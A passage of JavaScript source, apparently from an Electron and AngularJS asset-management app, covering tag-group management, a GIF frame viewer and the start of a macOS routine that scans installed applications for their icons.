        TagManager.addTagsToGroup = function (groupID, tags, duplicateMode) {
            if (tags?.length === 0) return;
            var group = TagManager.groupMappings[groupID];
            if (!group) return;
            tags = [...new Set(tags)];
            tags.forEach(function (tag) {
                tag = tag.replace(/\r?\n?/g, '');
                if (group.tags.indexOf(tag) === -1) {
                    group.tags.push(tag);
                    if (!duplicateMode && TagManager.tagMappings[tag] && TagManager.tagMappings[tag].groups) {
                        TagManager.tagMappings[tag].color = group.color;
                        TagManager.tagMappings[tag].groups.forEach(function (oriGroup) {
                            var g = TagManager.groupMappings[oriGroup];
                            if (!g) return;
                            var idx = g.tags.indexOf(tag);
                            if (idx !== -1) {
                                g.tags.splice(idx, 1);
                            }
                        })
                    }
                }
            });

            TagManager.calculateTags();
            TagManager.saveGroup();
            try {
                electronLog.info(`[app] Add tag: ${JSON.stringify(tags)} to tag group: ${group.name}(${group.id})`);
            } catch (err) {};
        };

        TagManager.moveTagsToGroup = function (groupID, tags) {
            if (tags?.length === 0) return;
            var group = TagManager.groupMappings[groupID];
            if (!group) return;
            tags = [...new Set(tags)];
            tags.forEach(function (tag) {
                tag = tag.replace(/\r?\n?/g, '');
                group.tags.push(tag);
                if (TagManager.tagMappings[tag] && TagManager.tagMappings[tag].groups) {
                    TagManager.tagMappings[tag].color = group.color;
                    TagManager.tagMappings[tag].groups.forEach(function (oriGroup) {
                        var g = TagManager.groupMappings[oriGroup];
                        if (!g) return;
                        var idx = g.tags.indexOf(tag);
                        if (idx !== -1) {
                            g.tags.splice(idx, 1);
                        }
                    })
                }
                group.tags = [...new Set(group.tags)];
            });

            TagManager.calculateTags();
            TagManager.saveGroup();
            try {
                electronLog.info(`[app] Add tag: ${JSON.stringify(tags)} to tag group: ${group.name}(${group.id})`);
            } catch (err) {};
        };

        TagManager.removeTagsFromGroup = function (groupID, tags) {
            if (tags?.length === 0) return;
            var group = TagManager.groupMappings[groupID];
            if (!group) return;
            $scope.checkOperationSafety2(tags.length, function () {
                tags.forEach(function (tag) {
                    var idx = group.tags.indexOf(tag);
                    if (idx !== -1) {
                        group.tags.splice(idx, 1);
                        if (TagManager.tagMappings[tag] && TagManager.tagMappings[tag].color) {
                            delete TagManager.tagMappings[tag].color;
                        }
                    }
                });
                TagManager.calculateTags();
                TagManager.saveGroup();
                try {
                    electronLog.info(`[app] Remove tag: ${JSON.stringify(tags)} from tag group: ${group.name}(${group.id})`);
                } catch (err) {};
                if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteFolder == 'true') {
                    $scope.removeSound.play();
                }
            }, 1);
        };

        TagManager.filterWithTags = function (tags) {
            $scope.viewMode = '';
            $scope.openAll(false, function () {
                $timeout(function () {
                    eagle.filter.isOpen = true;
                    eagle.filter.tagFilterLogic = "OR";
                    $scope.filterWithTags(tags);
                    $scope.$broadcast("Update_Tags_Filter");
                }, 200);
            });
        };

        $scope.TagManager = TagManager;

        $scope.createTagGroup = function () {
            var newGroup = TagManager.createGroup($filter('i18n')('general.untitled.tagGroup'));
            $scope.tagViewMode = "GROUP";
            $scope.tagViewModeName = `GROUP-${newGroup.id}`;
            $scope.currentTagGroup = newGroup;
            $scope.renameTagGroup(newGroup);
            $scope.selectedTags = {};
            TagManager.renderTagsResult();
        };

        $scope.openTagAllGroup = function () {
            if ($scope.tagViewMode === "ALL") return;
            tagRectSelecting = false;
            $scope.keyword = "";
            $scope.tagViewMode = "ALL";
            $scope.tagViewModeName = "ALL";
            $rootScope.currentFocus = 'tags';
            $scope.currentTagGroup = undefined;
            $scope.selectedTags = {};
            TagManager.renderTagsResult();
        };

        $scope.openUnfiledGroup = function () {
            if ($scope.tagViewMode === "UNFILED") return;
            tagRectSelecting = false;
            $scope.keyword = "";
            $scope.tagViewMode = "UNFILED";
            $scope.tagViewModeName = "UNFILED";
            $rootScope.currentFocus = 'tags';
            $scope.currentTagGroup = undefined;
            $scope.selectedTags = {};
            TagManager.renderTagsResult();
        };

        $scope.openStarredGroup = function () {
            if ($scope.tagViewMode === "STARRED") return;
            tagRectSelecting = false;
            $scope.keyword = "";
            $scope.tagViewMode = "STARRED";
            $scope.tagViewModeName = "STARRED";
            $rootScope.currentFocus = 'tags';
            $scope.currentTagGroup = undefined;
            $scope.selectedTags = {};
            TagManager.renderTagsResult();
        };

        $scope.openTagGroup = function (group) {
            tagRectSelecting = false;
            $scope.keyword = "";
            $scope.tagViewMode = "GROUP";
            $scope.tagViewModeName = `GROUP-${group.id}`;
            $rootScope.currentFocus = 'tags';
            $scope.currentTagGroup = group;
            TagManager.renderTagsResult();
            $("input:focus").blur();
            if ($scope.currentTagGroup === group) return;
            $scope.selectedTags = {};
        };

        
        $scope.addStarredTags = () => {
            $timeout(() => {
                const originSelected = $scope.TagManager.starredTags.reduce((acc, cur) => {
                    acc[cur] = true;
                    return acc;
                }, {});

                TagSelectPanel.open({
                    tagManager: $scope.TagManager,
                    selectedTags: originSelected,
                    pinSelected: false,
                    onChanged: (result) => {
                        if (!result?.isDirty) return;
                        const { selectedTags, deselectedTags } = result;

                        // 即將新增的標籤 
                        let add = [];
                        if (Object.keys(selectedTags).length > 0) {
                            Object.keys(selectedTags).forEach((tag) => {
                                if (originSelected[tag]) return;
                                add.push(tag);
                            });
                        }
                        $scope.TagManager.addStarredTags(add);

                        let remove = [];
                        if (Object.keys(deselectedTags).length > 0) {
                            Object.keys(deselectedTags).forEach((tag) => {
                                remove.push(tag);
                            });
                        }
                        $scope.TagManager.removeStarredTags(remove);
                        $scope.calculateImageBinding({ ignoreSort: true }, () => {});
                    }
                });
            }, 50);
        };

        $scope.addGroupTags = (group) => {
            $timeout(() => {
                const originSelected = group.tags.reduce((acc, cur) => {
                    acc[cur] = true;
                    return acc;
                }, {});

                TagSelectPanel.open({
                    tagManager: $scope.TagManager,
                    selectedTags: originSelected,
                    pinSelected: false,
                    onChanged: (result) => {
                        if (!result?.isDirty) return;
                        const { selectedTags, deselectedTags } = result;

                        // 即將新增的標籤 
                        let add = [];
                        if (Object.keys(selectedTags).length > 0) {
                            Object.keys(selectedTags).forEach((tag) => {
                                if (originSelected[tag]) return;
                                add.push(tag);
                            });
                        }
                        $scope.TagManager.addTagsToGroup(group.id, add, true);

                        let remove = [];
                        if (Object.keys(deselectedTags).length > 0) {
                            Object.keys(deselectedTags).forEach((tag) => {
                                remove.push(tag);
                            });
                        }
                        $scope.TagManager.removeTagsFromGroup(group.id, remove);
                        $scope.calculateImageBinding({ ignoreSort: true }, () => {});
                    }
                });
            }, 50);
        };

        $scope.openTagGroupContextMenu = (event, tagGroup) => {

            let historyLibraryMenu = {};
            historyLibraryMenu.items = $bodyScope.getLibraryHistory().filter((history) => {
                var isCurrent = false;
                if ($bodyScope.libraryPath) {
                    isCurrent = path.normalize(history.path) == path.normalize($bodyScope.libraryPath);
                }
                return !isCurrent;
            }).map((history) => {
                return {
                    label: history.name,
                    keywords: `${i18n.__('context.image.addToLibrary')} library 資源庫`,
                    accelerator: history.dir,
                    icon: 'ic-library-logo.svg',
                    click: () => {
                        if (!tagGroup || !history) return;
                        if (fs.existsSync(history.path)) {
                            $rootScope.$broadcast("ADD_TO_LIBRARY", {
                                tagGroup, tagGroup,
                                items: [],
                                library: history
                            });

                            $scope.$evalAsync();
                        }
                    }
                }
            });
            const $target = $(".tag-manager-sidebar .sidebar-item").has(event.target);
            ContextMenu.open({
                items: [
                    // 搜尋
                    {
                        label: i18n.__('context.tagGroup.filterWithTags'),
                        keywords: '搜尋 篩選 標籤 Search Filter Tag 検索フィルタータグ',
                        icon: 'ic-tag-filter.svg',
                        click: () => {
                            TagManager.filterWithTags(tagGroup.tags);
                            $scope.$evalAsync();
                        }
                    },
                    { role: 'separator' },
                    // 重命名
                    {
                        label: i18n.__('context.tagGroup.rename'),
                        keywords: '重命名 rename 名前を変更する tag group',
                        icon: 'ic-rename.svg',
                        accelerator: (process.platform === 'win32')? 'F2' : '⌘+R',
                        click: () => {
                            $scope.renameTagGroup(tagGroup);
                            $scope.$evalAsync();
                        }
                    },
                    // 刪除群組
                    {
                        label: i18n.__('context.tagGroup.remove'),
                        keywords: '刪除 移除 delete remove tag group',
                        icon: 'ic-tag-remove.svg',
                        accelerator: (process.platform === 'win32')? 'Del' : '⌘+⌫',
                        click: () => {
                            $scope.removeTagGroup(tagGroup);
                            $scope.$evalAsync();
                        }
                    },
                    // 添加至其它資源庫
                    { role: 'separator' },
                    {
                        label: i18n.__('context.image.addToLibrary'),
                        keywords: '',
                        icon: 'ic-library-add-to.svg',
                        submenu: historyLibraryMenu
                    },
                    { role: 'separator' },
                    // 顏色
                    {
                        role: 'color',
                        click: (color) => {
                            $scope.changeTagGroupColor(event, tagGroup, color);
                            $scope.$evalAsync();
                        }
                    }
                ],
                onOpened: () => {
                    $target.addClass("context-activate");
                },
                onClosed: () => {
                    $target.removeClass("context-activate");
                },
                showSearch: true
            });
        };        

        $scope.renameTagGroup = function (group) {
            $scope.currentTagGroup = group;
            $scope.newGroupName = group.name;
            group.editable = true;
            setTimeout(function() {
                $("#group-input-" + group.id).focus().select();
            }, 50);
            setTimeout(function() {
                $("#group-input-" + group.id).focus().select();
            }, 100);
        };

        $scope.changeTagGroupColor = function (event, tagGroup, color) {
            if (!color) {
                delete tagGroup.color;
            }
            else {
                tagGroup.color = color;
            }

            for (var i = 0; i < tagGroup.tags.length; i++) {
                var name = tagGroup.tags[i];
                if (TagManager.tagMappings[name]) {
                    if (!color) {
                        TagManager.tagMappings[name].color = color;
                    }
                    else {
                        delete TagManager.tagMappings[name].color;
                    }
                }
            }

            TagManager.calculateTags();
            TagManager.saveGroup();
            try { electronLog && electronLog.info(`[app] Change tag group: ${tagGroup.name}(${tagGroup.id}) color to: ${color}`); } catch (err) {};
            analytics.event('ChangeColor', 'TagGroup', color);
        };

        $scope.removeTagGroup = function (group) {

            const remove = function (group) {
                var idx = TagManager.removeGroup(group.id);
                if (TagManager.groups[idx]) {
                    $scope.currentTagGroup = TagManager.groups[idx];
                }
                else if (TagManager.groups[idx - 1]) {
                    $scope.currentTagGroup = TagManager.groups[idx - 1];
                }
                else {
                    $scope.openTagAllGroup();
                }
            };

            if (group.tags.length > 0) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__("dialog.removeTagGroup.title")}</h4>
                            <p class="alert-desc">${i18n.__("dialog.removeTagGroup.desc")}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__('dialog.removeTagGroup.button'),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function () {
                    remove(group);
                    $scope.$evalAsync();
                });
            }
            else {
                remove(group);
                $scope.$evalAsync();
            }
        };

        $scope.renameTagGroupBlur = function (group, newName) {
            if (newName) {
                TagManager.renameGroup(group.id, newName);
                delete group.editable;
            }
        };

        $scope.renameTagGroupKeyup = function (event, group, newName) {
            event.stopPropagation();
            // event.preventDefault();
            if (event.keyCode === 13) {
                TagManager.renameGroup(group.id, newName);
                group.editable = false;
            }
            else if (event.keyCode === 27) {
                //
                group.editable = false;
            }
            return false;
        };

        ipcRenderer.on('jieba-extract-done', function (e, result) {

            // console.timeEnd("======== 取得推荐标签 ========");

            var selectedTags = eagle.inspector.calculateTags($scope.selected);

            result.forEach(function (term) {
                var idx = TagManager.suggestions.indexOf(term.word);
                // var existIdx = selectedTags.indexOf(term.word);

                if (idx == -1 && term.word.split(/\d/).length < 3 && term.word.localeLength() >= 2) {
                    TagManager.suggestions.push(term.word.capitalize());
                }
            });

            TagManager.suggestions = TagManager.excludeExistTags(selectedTags, TagManager.suggestions);
            // TagManager.suggestions = TagManager.suggestions.unique();
            TagManager.suggestions = [...new Set(TagManager.suggestions)];

            // 移除 Stopword
            var sw = require('stopword');
            TagManager.suggestions = sw.removeStopwords(TagManager.suggestions)
            TagManager.suggestions = sw.removeStopwords(TagManager.suggestions, sw.zh);
            TagManager.suggestions = sw.removeStopwords(TagManager.suggestions, sw.ja);

            // Note: 优先将已经有标签放在最前方，剩下的标签使用标题排序放在后面
            // console.log(TagManager.suggestions);
            TagManager.suggestions = TagManager.suggestions.sort(function(a, b) {
                if (TagManager.tagMappings[a])
                    return -1;
                if (TagManager.tagMappings[b])
                    return 1;
                try {
                    var na = a.toLowerCase();
                    var nb = b.toLowerCase();
                    if (na && na) {
                        return na.localeCompare(nb, languageBCP, {numeric: true});
                    }
                }
                catch (err) {}
                return 0;
            });
            $scope.$evalAsync();
        });

        // GIF Viewer
        $scope.gifPlayer;
        $scope.gifUpadteInterval;

        $scope.gifViewer = {
            frames: [],
            mousedownTime: 0,
            mousedownX: 0,
            mousedownY: 0,
            range: undefined,
            speed: 1,
            setThumbnail: function () {
                if (!$scope.isGifReady) return;
                var curr = $scope.gifPlayer.get_current_frame();
                var f = $scope.gifPlayer.get_frame(curr);
                if (!f) return;
                var b64 = f.base64;
                var canvas = document.createElement('canvas');
                var ctx = canvas.getContext('2d');
                var image = new Image();
                image.onload = function() {
                    canvas.width = image.width;
                    canvas.height = image.height;
                    ctx.drawImage(image, 0, 0);

                    var ratio = 1;
                    if (canvas.height > canvas.width) {
                        if (canvas.width > 480) {
                            ratio = 480 / canvas.width;
                        }
                        else {
                            ratio = 1;
                        }
                    }
                    else {
                        if (canvas.height > 480) {
                            ratio = 480 / canvas.height;
                        }
                        else {
                            ratio = 1;
                        }
                    }
                    if (ratio !== 1) { canvasResizeTo(canvas, ratio); }

                    var base64string = canvas.toDataURL();
                    IPCHelper.send('regenerate-gif-thumbnail', {
                        gif: $scope.current,
                        base64string: base64string
                    });
                };
                image.src = f.base64;
            },
            setSpeed: function (speed = 1) {
                if (!$scope.gifPlayer) return;
                $scope.gifViewer.speed = speed;
                $scope.$evalAsync();
                $scope.gifPlayer.set_speed(speed);
                $(".gif-toolbar-btn.speed span").text(`${speed}x`);
            },
            mousedown: function (event) {
                if (event.button !== 0) return;
                $scope.gifViewer.mousedownX = event.clientX;
                $scope.gifViewer.mousedownY = event.clientY;
                $scope.gifViewer.mousedownTime = Date.now();
            },
            mouseup: function (event) {
                if (event.button !== 0) return;
                // 判断是点击或是拖拽
                if (Date.now() - $scope.gifViewer.mousedownTime < 333 && Math.abs($scope.gifViewer.mousedownX - event.clientX) < 5 && Math.abs($scope.gifViewer.mousedownY - event.clientY) < 5)  {
                    $scope.toggleGifPlay();
                    $scope.$evalAsync();
                }
            },
            cancelRange: function () {
                if ($scope.gifViewer.range !== undefined) {
                    $scope.gifViewer.range = undefined;
                    var $resizableBar = $(".gif-toolbar .resize-bar");
                    $resizableBar.css({
                        left: "0%",
                        width: "100%"
                    });
                    if ($scope.gifPlayer) {
                        $scope.gifPlayer.move_to(0);
                    }
                }
            },
            nextFrame: function () {
                var curr = $scope.gifPlayer.get_current_frame();
                var index = curr + 1;
                if (index + 1 > $scope.gifViewer.frames.length - 1) index = $scope.gifViewer.frames.length - 1;
                $scope.gifViewer.setFrame(index);
                $scope.gifPlayer.pause();
            },
            prevFrame: function () {
                var curr = $scope.gifPlayer.get_current_frame();
                var index = curr - 1;
                if (index - 1 < 0) index = 0;
                $scope.gifViewer.setFrame(index);
                $scope.gifPlayer.pause();
            },
            setFrame: function (index) {
                $scope.gifPlayer.move_to(index);
            },
            onProgress: function (progress, length) {
                clearInterval($scope.gifUpadteInterval);
                if ($scope.isGifReady === true) {
                    $scope.isGifReady = false;
                    delete $scope.gifViewer.frames;
                    $scope.gifViewer.frames = [];
                    $scope.gifViewer.mousedownTime = 0;
                    $scope.gifViewer.mousedownX = 0;
                    $scope.gifViewer.mousedownY = 0;
                    $scope.gifViewer.range = undefined;
                    $scope.gifPlayer = undefined;
                    $scope.$evalAsync();
                }
                updateGifProgressbar(progress);
                $(".gif-toolbar .message span").text(`${parseInt(progress * 100)}%`)
            },
            onFinished: function (result) {
                $scope.gifViewer.range = undefined;
                $scope.gifPlayer = result.gifPlayer;
                $scope.isGifReady = true;
                $scope.gifViewer.frames = result.frames;
                $scope.gifViewer.playing = result.playing;
                $scope.gifViewer.setSpeed(1);
                $scope.$evalAsync();
                var $resizableBar = $(".gif-toolbar .resize-bar");
                $(".gif-toolbar .total-frame").text(`/ ${$scope.gifViewer.frames.length}`);

                if ($resizableBar.is('.ui-resizable')) {
                    $resizableBar.resizable( "destroy" );
                }

                $resizableBar.css({
                    left: 0,
                    width: 'auto'
                });

                $(".gif-toolbar.in").removeClass("in");
                setTimeout(function () {
                    $(".gif-toolbar").addClass("in");
                }, 100);

                var gifPlayerResizeOriginalState = false;
                var gifPlayerResizing = false;
                var gifPlayerLastResizeLeft;
                var gifPlayerLastResizeWidth;
                var gifPlayerToolbarOffset;
                $resizableBar.resizable({
                	minWidth: 2,
                    handles: "e, w",
                    containment: ".gif-toolbar .progress-bar",
                    start: function (event, ui) {
                        gifPlayerLastResizeLeft = parseInt(ui.element.css("left"));
                        gifPlayerLastResizeWidth = ui.element.width();
                        gifPlayerResizeOriginalState = $scope.gifPlayer.get_playing();
                        $scope.gifPlayer.pause();
                        gifPlayerToolbarOffset = $(".gif-toolbar .progress-bar").offset().left;
                    },
                    resize: function (event, ui) {
                        $("#gif-progress-indicator").hide();
                        gifPlayerResizing = true;

                        var currentPosX = event.pageX - gifPlayerToolbarOffset;
                        var width = $(".gif-toolbar .progress-bar").width();
                        var index = Math.round(currentPosX / width * $scope.gifViewer.frames.length) + 1;
                        // if (!index) return;
                        if (index -1  >= $scope.gifViewer.frames.length) index = $scope.gifViewer.frames.length;
                        if (!gifPlayerProgressDown) {
                            var img = $("#thumbnail-preview img")[0];
                            var f = $scope.gifPlayer.get_frame(index - 1);
                            if (!f) return;
                            img.src = f.base64;

                            var w = $("#thumbnail-preview img").width();
                            var left = currentPosX - w / 2;
                            if (left < 0) left = 0;
                            if (left > width - w) left = width - w;

                            $("#thumbnail-preview").css({
                                transform: `translateX(${left}px)`
                            });

                            $("#thumbnail-preview .current-index").text(`${index}`);
                            $("#thumbnail-preview").show();
                        }
                        else {
                            $(".gif-toolbar .progress-bar .ui-resizable-handle").css("pointer-events", "none");
                            $("#gif-progress-indicator").css('left', `${ (index - 1) / ($scope.gifViewer.frames.length - 1) * 100 }%`);
                            $scope.gifPlayer.move_to(index - 1);
                            $scope.gifPlayer.pause();
                        }

                    },
                    stop: function (event, ui) {
                        gifPlayerResizing = false;
                        var frames = $scope.gifViewer.frames;
                        var parentWidth = $(".gif-toolbar .progress-bar").width();
                        var left = parseInt(ui.element.css("left"));
                        var width = ui.element.width();
                        var leftP = left / parentWidth * 100;
                        var widthP = width / parentWidth * 100;;
                        $resizableBar.css({
                            left: `${leftP}%`,
                            width: `${widthP}%`
                        });

                        // 移動 start
                        // var index = parseInt($(".gif-toolbar .current-frame").text()) - 1;
                        var index = $scope.gifPlayer.get_current_frame();
                        if (index < 0) index = 0;
                        if (gifPlayerLastResizeLeft !== left) {
                            if ($scope.gifViewer.range === undefined) {
                                $scope.gifViewer.range = [index, $scope.gifViewer.frames.length];
                            }
                            else {
                                $scope.gifViewer.range = [index, $scope.gifViewer.range[1]];
                            }
                        }
                        // 移動 end
                        else if (gifPlayerLastResizeWidth !== width) {
                            if ($scope.gifViewer.range === undefined) {
                                $scope.gifViewer.range = [0, index + 1];
                            }
                            else {
                                $scope.gifViewer.range = [$scope.gifViewer.range[0], index + 1];
                            }
                        }

                        if ($scope.gifViewer.range && $scope.gifViewer.range[0] > $scope.gifViewer.range[1]) {
                            $scope.gifViewer.range = [$scope.gifViewer.range[1], $scope.gifViewer.range[0]];
                        }
                        console.log($scope.gifViewer.range);

                        $("#gif-progress-indicator").show();
                        if (!$(".gif-toolbar-btn.play-btn").is(":visible")) {
                            $scope.gifPlayer.play();
                        }

                        gifPlayerProgressDown = false;
                        $(".gif-toolbar .progress-bar .ui-resizable-handle").css("pointer-events", "");
                        // $(".gif-toolbar").trigger("mouseup");
                    }
                });


                $scope.gifUpadteInterval = setInterval(function () {
                    try {
                        var c = $scope.gifPlayer.get_current_frame();
                        var length = $scope.gifPlayer.get_length();

                        if ($scope.gifViewer.range && !gifPlayerResizing && !gifPlayerProgressDown) {
                            var start = $scope.gifViewer.range[0];
                            var end = $scope.gifViewer.range[1];
                            if (c <= start) { 
                                c = start; 
                                $scope.gifPlayer.move_to(c);
                            }
                            if (c >= end) { 
                                c = start; 
                                $scope.gifPlayer.move_to(c);
                            }
                        }

                        var text = paddingNumber(c + 1, `${length}`.length);
                        if ($(".gif-toolbar .current-frame").text() !== text) {
                            $(".gif-toolbar .current-frame").text(text);
                        }
                        updateGifIndicator(c + 1);
                    }
                    catch (err) {}
                }, 50);
            }
        };

        var updateGifIndicator = function (index) {
            var percent = (index - 1) / ($scope.gifViewer.frames.length - 1) * 100;
            if (percent < 0) percent = 0;
            var value = `${ percent }%`;
            if ($("#gif-progress-indicator").css('left') !== value) {
                $("#gif-progress-indicator").css('left', value);
            }
        };
        
        var updateGifProgressbar = function (progress) {
            $(".gif-toolbar .progress-bar .current").css('width', `${ progress * 100 }%`);
        };

        var gifPlayerProgressDown = false;
        var gifPlayerOriginalState = false;
        $("body").on('mousedown', ".gif-toolbar .progress-bar", function (event) {
        	var self = this;
            if (event.button === 0 && $scope.gifPlayer) {
                gifPlayerProgressDown = true;
                gifPlayerOriginalState = $scope.gifPlayer.get_playing();
                $("#thumbnail-preview").hide();

                if ($scope.isGifReady) {
                    var width = $(this).width();
                    var currentPosX = event.offsetX;
                    var index = Math.round(currentPosX / width * $scope.gifViewer.frames.length) + 1;
                    if (!index) return;
                    if (index -1  >= $scope.gifViewer.frames.length) index = $scope.gifViewer.frames.length;
                    if ($scope.gifViewer.range !== undefined) {
                        if (index -1 > $scope.gifViewer.range[1] || index -1 < $scope.gifViewer.range[0]) {
                            return;
                        }
                    }
                    $("#gif-progress-indicator").css('left', `${ (index - 1) / ($scope.gifViewer.frames.length - 1) * 100 }%`);
                    $scope.gifPlayer.move_to(index - 1);
                    $scope.gifPlayer.pause();

                    var startX = event.pageX;
	            	$("body").off("mousemove.gif").on("mousemove.gif", function (event) {
	            		var offsetX = event.pageX - startX;
	            		var x = currentPosX + offsetX;
	            		var width = $(self).width();
	                    var index = Math.round(x / width * $scope.gifViewer.frames.length) + 1;
	                    if (index -1  >= $scope.gifViewer.frames.length) index = $scope.gifViewer.frames.length;
	                    if (index < 1) index = 1;
	            		$(".gif-toolbar .progress-bar .ui-resizable-handle").css("pointer-events", "none");
		                $("#gif-progress-indicator").css('left', `${ (index - 1) / ($scope.gifViewer.frames.length - 1) * 100 }%`);
		                $scope.gifPlayer.move_to(index - 1);
		                $scope.gifPlayer.pause();
	            	});

	            	$("body").off("mouseup.gif").on("mouseup.gif", function (event) {
            			if (event.button === 0) {
            				event.stopPropagation();
			                gifPlayerProgressDown = false;
			                if (gifPlayerOriginalState && $scope.gifPlayer) {
			                    $scope.gifPlayer.play();
			                }
			            }
			            $(".gif-toolbar .progress-bar .ui-resizable-handle").css("pointer-events", "");
            			$("body").off("mousemove.gif");
            			$("body").off("mouseup.gif");
            		});
                }
            }
        });

        $("body").on('mouseup', ".gif-toolbar", function (event) {
            if (event.button === 0) {
            }
            else if (event.button === 2) {
            	$scope.gifPlayer.pause();
                $scope.openGifContextMenu(event);
            }
        });

        $("body").on('mouseleave', ".gif-toolbar .progress-bar", function (event) {
            if (!gifPlayerProgressDown) {
                $("#thumbnail-preview").hide();
            }
        });

        $("body").on('mousemove', ".gif-toolbar .progress-bar .ui-resizable-handle", function (event) {
            event.stopPropagation();
        });

        $("body").on('mousewheel', ".gif-toolbar .progress-bar", function (e) {
        	$scope.gifPlayer.pause();
        	var ne = e.originalEvent.wheelDelta / Math.abs(e.originalEvent.wheelDelta) || 1;
        	console.log(ne);
        	if (ne > 0) {
        		$scope.gifViewer.nextFrame();
        	}
        	else {
        		$scope.gifViewer.prevFrame();
        	}
        });

        $("body").on('mousemove', ".gif-toolbar .progress-bar", function (event) {
            if (event.button === 0) {
                var currentPosX = event.offsetX;

                // 显示缩略图
                if ($scope.isGifReady) {
                    var width = $(this).width();
                    var index = Math.round(currentPosX / width * $scope.gifViewer.frames.length) + 1;
                    // if (!index) return;
                    if (index -1  >= $scope.gifViewer.frames.length) index = $scope.gifViewer.frames.length;
                    if (!gifPlayerProgressDown) {
                        var img = $("#thumbnail-preview img")[0];
                        var f = $scope.gifPlayer.get_frame(index - 1);
                        if (!f) return;
                        img.src = f.base64;

                        var w = $("#thumbnail-preview img").width();
                        var left = currentPosX - w / 2;
                        if (left < 0) left = 0;
                        if (left > width - w) left = width - w;

                        $("#thumbnail-preview").css({
                            transform: `translateX(${left}px)`
                        });

                        $("#thumbnail-preview .current-index").text(`${index}`);
                        $("#thumbnail-preview").show();
                    }
                }
            }
        });
    }
]);


var installedApplications = {

    xmind: { isInstalled: false, indentifier: "org.xmind.cathy.application" },
    mindnode: { isInstalled: false, indentifier: "com.ideasoncanvas.mindnode.macos" },
    graffle: { isInstalled: false, indentifier: "com.omnigroup.OmniGraffle7" },

    photoshop: { isInstalled: false, indentifier: "com.adobe.Photoshop" },
    indesign: { isInstalled: false, indentifier: "com.adobe.indesign" },
    illustrator: { isInstalled: false, indentifier: "com.adobe.illustrator" },
    lightroom: { isInstalled: false, indentifier: "com.adobe.lightroomCC" },
    lightroomClassic: { isInstalled: false, indentifier: "com.adobe.LightroomClassicCC7" },

    polarr: { isInstalled: false, indentifier: "co.polarr.ppeosx" },
    acorn: { isInstalled: false, indentifier: "com.flyingmeat.Acorn6" },
    pixelmator: { isInstalled: false, indentifier: "com.pixelmatorteam.pixelmator" },
    pxd: { isInstalled: false, indentifier: "com.pixelmatorteam.pixelmator.x" },

    sketch: { isInstalled: false, indentifier: "com.bohemiancoding.sketch3" },
    figma: { isInstalled: false, indentifier: "com.figma.Desktop" },
    xd: { isInstalled: false, indentifier: "com.adobe.xd" },
    skp: { isInstalled: false, indentifier: "com.sketchup.SketchUp.2019" },
    dwg: { isInstalled: false, indentifier: "com.autodesk.AutoCAD2020" },
    c4d: { isInstalled: false, indentifier: "net.maxon.cinema4d" },
    clip: { isInstalled: false, indentifier: "jp.co.celsys.CLIPSTUDIOPAINT" },
    prd: { isInstalled: false, indentifier: "com.danielhooper.principle" },

    powerpoint: { isInstalled: false, indentifier: "com.microsoft.Powerpoint" },
    word: { isInstalled: false, indentifier: "com.microsoft.Word" },
    excel: { isInstalled: false, indentifier: "com.microsoft.Excel" },
    eddx: { isInstalled: false, indentifier: "com.edrawsoft.edrawmax" },
    emmx: { isInstalled: false, indentifier: "com.edrawsoft.mindmaster" },

    afphoto: { isInstalled: false, indentifier: "com.seriflabs.affinityphoto" },
    afdesign: { isInstalled: false, indentifier: "com.seriflabs.affinitydesigner" },
    afpub: { isInstalled: false, indentifier: "com.seriflabs.affinitypublisher" },

    chrome: { isInstalled: false, indentifier: "com.google.Chrome" },
    safari: { isInstalled: false, indentifier: "com.apple.Safari" },
    firefox: { isInstalled: false, indentifier: "org.mozilla.firefox" },

    keynote: { isInstalled: false, indentifier: "com.apple.iWork.Keynote" },
    pages: { isInstalled: false, indentifier: "com.apple.iWork.Pages" },
    numbers: { isInstalled: false, indentifier: "com.apple.iWork.Numbers" },

    preview: { isInstalled: true, indentifier: "com.apple.Preview" },
    itunes: { isInstalled: false, indentifier: "com.apple.itunes" },
    sketchesfree: { isInstalled: false, indentifier: "com.tayasui.sketchesmacfree" },
    sketches: { isInstalled: false, indentifier: "com.tayasui.sketchesmac" },

    iina: { isInstalled: false, indentifier: "com.colliderli.iina" },
    vlc: { isInstalled: false, indentifier: "org.videolan.vlc" },
    quicktime: { isInstalled: false, indentifier: "com.apple.QuickTimePlayerX" },
};

if (process.platform == 'darwin') {
    try {
        const glob = require('fast-glob');
        const BLACK_LIST = { "Calendar": true, "Photo Booth": true, "System Preferences": true, "Migration Assistant": true, "System Information": true };
        if (!fs.existsSync(EAGLE_APP_ICON_TEMP_PATH)) {
            fs.mkdirSync(EAGLE_APP_ICON_TEMP_PATH);
        }

		let existIcons = fs.readdirSync(EAGLE_APP_ICON_TEMP_PATH);
		let existIconNames = {};
		existIcons.forEach((existIcon) => {
			existIconNames[existIcon] = true;
		});

        glob(["**.app", "**/**.app"], { cwd: "/Applications/", deep: 2, onlyDirectories: true, absolute: true, unique: true }).then((apps) => {
            glob(["**.app", "**/**.app"], { cwd: "/System/Applications/", deep: 2, onlyDirectories: true, absolute: true, unique: true }).then((systemApps) => {
                apps = [...apps, ...systemApps];
                apps.forEach(function(appPath, index) {
					
					try {
						var appName = path.parse(appPath).name;
						var appNameLower = appName.toLowerCase() + ".app";
						var outPath = `${EAGLE_APP_ICON_TEMP_PATH}/${appName}.png`;
						var outPath2 = `${EAGLE_APP_ICON_TEMP_PATH}/${appName}@2x.png`;

						if (!existIconNames[`${appName}.png`] && !BLACK_LIST[appName]) {
						// if (!fs.existsSync(outPath) && !BLACK_LIST[appName]) {
							let parseIcns = function (plist) {
								try {
									if (!plist.startsWith("bplist")) {
										const matches = /<key>CFBundleIconFile<\/key>[\s]*<string>(.+?)<\/string>/.exec(plist);
										if (!matches) {
											// electronLog.error(`[app] Can't get app icns for ${appName}:`)
											return;
										}
										return matches[1];
									}
									else {
										const bplist = require(appRoot + '/my_modules/bplist-parse');
										const obj = bplist.parseFileSync(`${appPath}/Contents/Info.plist`);
										console.log(obj[0]?.CFBundleIconFile)
										return obj[0]?.CFBundleIconFile;
									}
								}
								catch (err) {}
							};
							// console.log(`Generate app icon: ${appPath}`);
							// electronLog.info(`Gen icon: ${appPath}`);
